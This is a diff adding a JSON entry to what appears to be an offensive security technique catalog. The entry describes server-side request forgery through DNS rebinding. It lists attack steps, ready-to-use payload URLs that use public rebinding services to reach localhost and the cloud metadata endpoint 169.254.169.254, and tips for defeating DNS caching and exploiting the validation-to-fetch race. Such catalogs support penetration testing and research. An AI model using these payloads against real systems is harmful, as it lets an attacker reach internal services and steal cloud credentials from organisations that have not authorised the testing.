@@ -1,0 +1,47 @@
+{
+  "id": "ssrf-dns-rebinding-bypass",
+  "title": "SSRF via DNS Rebinding",
+  "category": "ssrf",
+  "tags": ["dns-rebinding", "ssrf", "bypass", "ip-allowlist"],
+  "applicability": {
+    "technologies": ["node", "python", "java", "go", "ruby"],
+    "contexts": ["url-parameter", "webhook-url", "api-endpoint"],
+    "preconditions": ["server-side-request", "dns-based-validation"]
+  },
+  "technique": {
+    "summary": "Bypass SSRF protections that validate hostnames by resolving a DNS name that alternates between a public IP and an internal IP (127.0.0.1, 169.254.169.254). The first resolution passes the check, the second hits the internal target.",
+    "steps": [
+      "Identify an endpoint that fetches a user-supplied URL",
+      "Confirm the application validates the resolved IP against an allowlist/blocklist",
+      "Set up a DNS rebinding service (e.g., rbndr.us, 1u.ms) that alternates between a safe IP and the target internal IP",
+      "Submit the rebinding domain as the URL parameter",
+      "The first DNS resolution returns the safe IP (passes validation)",
+      "The second resolution (actual fetch) returns the internal IP",
+      "Extract the response containing internal service data"
+    ],
+    "payloads": [
+      {
+        "payload": "http://7f000001.c0a80001.rbndr.us/latest/meta-data/",
+        "encoding": "raw",
+        "context": "url-parameter",
+        "notes": "rbndr.us alternates between 127.0.0.1 and 192.168.0.1"
+      },
+      {
+        "payload": "http://A.169.254.169.254.1time.YOUR-SUBDOMAIN.d.1u.ms/",
+        "encoding": "raw",
+        "context": "url-parameter",
+        "notes": "1u.ms service — configure to return attacker IP first, then target"
+      }
+    ],
+    "bypassTechniques": [
+      "Use short TTL to defeat DNS caching",
+      "Race condition: make multiple rapid requests to increase rebinding success rate",
+      "Use TOCTOU gap between validation and fetch"
+    ]
+  },
+  "references": [
+    "https://portswigger.net/research/cracking-the-lens-targeting-https-hidden-attack-surface",
+    "https://github.com/taviso/rbndr"
+  ],
+  "source": "portswigger-research"
+}
